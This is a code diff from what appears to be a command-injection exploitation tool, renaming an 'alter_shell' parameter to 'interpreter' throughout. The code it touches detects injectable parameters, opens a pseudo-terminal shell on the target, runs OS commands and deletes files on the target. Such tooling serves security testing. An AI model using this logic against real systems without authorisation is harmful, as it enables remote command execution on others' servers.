@@ -56,7 +56,7 @@ def exit_handler(no_result):
 """
 Delete previous shells outputs.
 """
-def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique):
+def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique):
   if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
     if settings.VERBOSITY_LEVEL != 0:
       debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
@@ -72,16 +72,16 @@ def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_reque
         cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
       else:
         cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
-    injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+    injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
 
 
-def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response):
+def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response):
   try:
     checks.alert()
     go_back = False
     go_back_again = False
     if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
     while True:
       if go_back == True:
         break
@@ -104,9 +104,9 @@ def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix,
             if cmd.lower() in settings.SHELL_OPTIONS:
               if cmd.lower() == "quit" or cmd.lower() == "exit":
                 if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                 checks.quit(filename, url, _ = False)
-              go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)
+              go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)
               if go_back and go_back_again == False:
                 break
               if go_back and go_back_again:
@@ -119,16 +119,16 @@ def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix,
                 # The main command injection exploitation.
                 if settings.TIME_RELATED_ATTACK:
                   if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-                    check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
+                    check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique)
                   else:
-                    check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+                    check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
                   # Export injection result
                   checks.time_related_export_injection_results(cmd, separator, shell, check_exec_time)
                 else:
                   if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
-                    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                   else:
-                    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
+                    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
                   # Command execution results.
                   shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
                   shell = "".join(str(p) for p in shell)
@@ -163,11 +163,11 @@ def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix,
             return False
           else:
             if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-              delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+              delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
             return True
       elif gotshell in settings.CHOICE_QUIT:
         if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-          delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+          delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
         checks.quit(filename, url, _ = False)
       else:
         common.invalid_option(gotshell)
@@ -175,21 +175,21 @@ def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix,
 
   except KeyboardInterrupt:
     if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
     checks.handle_exploitation_interrupt(filename, url)
     # Continue chosen - re-enter the shell fresh.
-    return pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response)
+    return pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response)
 
   except SystemExit:
     if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
     settings.print_data_to_stdout(settings.END_LINE.CR)
     raise
 
   except EOFError:
     checks.EOFError_err_msg()
     if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
     settings.print_data_to_stdout(settings.END_LINE.CR)
     # Return False to stop searching after this combination was already reported.
     return True
@@ -315,7 +315,7 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
           stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
           if stored_row:
             try:
-              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
+              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
               url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
               # Re-apply the minimum safe delay to the stored session.
               if technique in (settings.INJECTION_TECHNIQUE.TIME_BASED, settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED):
@@ -347,18 +347,18 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
               # Change TAG on every request to prevent false-positive resutls.
               TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
               # The output file for file-based injection technique.
-              alter_shell = menu.options.alter_shell
+              interpreter = menu.options.interpreter
               tag_length = len(TAG) + 4
               if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                 OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
               for output_length in range(1, int(tag_length)):
                 try:
                   # Tempfile-based decision payload (check if host is vulnerable).
-                  if alter_shell:
+                  if interpreter:
                     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-                      payload = payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)
+                      payload = payloads.decision_alter_interpreter(separator, TAG, output_length, timesec, http_request_method)
                     else:
-                      payload = payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
+                      payload = payloads.decision_alter_interpreter(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                   else:
                     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                       payload = payloads.decision(separator, TAG, output_length, timesec, http_request_method)
@@ -418,7 +418,7 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
                         randvcalc = randv1 + randv2
 
                         if settings.TARGET_OS == settings.OS.WINDOWS:
-                          if alter_shell:
+                          if interpreter:
                             cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                           else:
                             rand_num = randv1 + randv2
@@ -434,9 +434,9 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
 
                         # Check for false positive resutls
                         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)
+                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)
                         else:
-                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)
+                          exec_time, output = injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, _false_positive_retry + 1, settings.FALSE_POSITIVE_RETRIES)
 
                         if checks.time_related_shell(url_time_response, exec_time, timesec):
                           if str(output) == str(randvcalc) and len(TAG) == output_length:
@@ -464,19 +464,19 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
 
                 except KeyboardInterrupt:
                   if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
-                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                   # Always raises - propagates out to controller.injection_proccess().
                   checks.handle_detection_interrupt(filename, url)
 
                 except SystemExit:
                   if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
-                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                   raise
 
                 except EOFError:
                   checks.EOFError_err_msg()
                   if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
-                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                    delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
                   raise
 
                 except Exception:
@@ -508,25 +508,25 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
               if not resumed:
                 shell = ""
                 checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
-                session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_exec_time, output_length, is_vulnerable=settings.INJECTION_LEVEL)
+                session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, original_exec_time, output_length, is_vulnerable=settings.INJECTION_LEVEL)
               else:
                 whitespace = settings.WHITESPACES[0]
               if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                 OUTPUT_TEXTFILE = ""
               url, prefix = probe_skip_testable_value_post_detection(separator, timesec, http_request_method, url, vuln_parameter, whitespace, url_time_response, technique, prefix)
               # Check for any enumeration options.
-              enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+              enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
               # Check for any system file access options.
-              file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+              file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
               # Check if defined single cmd.
               if menu.options.os_cmd:
                 cmd = menu.options.os_cmd
-                enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+                enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
                 # Export injection result
                 if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and len(output) > 1:
-                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
               # Pseudo-Terminal shell
-              if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
+              if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
                 continue
               else:
                 return
@@ -603,7 +603,7 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
           stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
           if stored_row:
             try:
-              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
+              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
               url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
               if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                 settings.FILE_BASED_STATE = True
@@ -642,15 +642,15 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
               randv2 = random.randrange(100)
               randvcalc = randv1 + randv2
 
-            # Define alter shell
-            alter_shell = menu.options.alter_shell
+            # Define alternative interpreter
+            interpreter = menu.options.interpreter
             try:
               # File-based decision payload (check if host is vulnerable).
-              if alter_shell:
+              if interpreter:
                 if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
-                  payload = payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
+                  payload = payloads.decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE)
                 else:
-                  payload = payloads.decision_alter_shell(separator, TAG, randv1, randv2)
+                  payload = payloads.decision_alter_interpreter(separator, TAG, randv1, randv2)
               else:
                 if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                   payload = payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
@@ -726,7 +726,7 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
               if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                 # Delete previous shell (text) files (output)
                 if 'vuln_parameter' in locals():
-                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
               else:
                 settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
               # Always raises; let injection_proccess() handle the skip/end/next/quit action.
@@ -735,7 +735,7 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
             except SystemExit:
               if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                 if 'vuln_parameter' in locals():
-                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
+                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
               else:
                 settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
               raise
@@ -773,7 +773,7 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
             # Export session
             if not resumed:
               checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
-              session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
+              session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell[0], vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
             else:
               whitespace = settings.WHITESPACES[0]
             cmd = maxlen =  ""
@@ -782,14 +782,14 @@ def do_results_based_proccess(url, timesec, filename, http_request_method, injec
             if technique != settings.INJECTION_TECHNIQUE.FILE_BASED:
               OUTPUT_TEXTFILE = ""
             # Check for any enumeration options.
-            enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+            enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
             # Check for any system file access options.
-            file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+            file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
              # Check if defined single cmd.
             if menu.options.os_cmd:
-              enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
+              enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
             # Pseudo-Terminal shell
-            if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
+            if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
               continue
             else:
               return
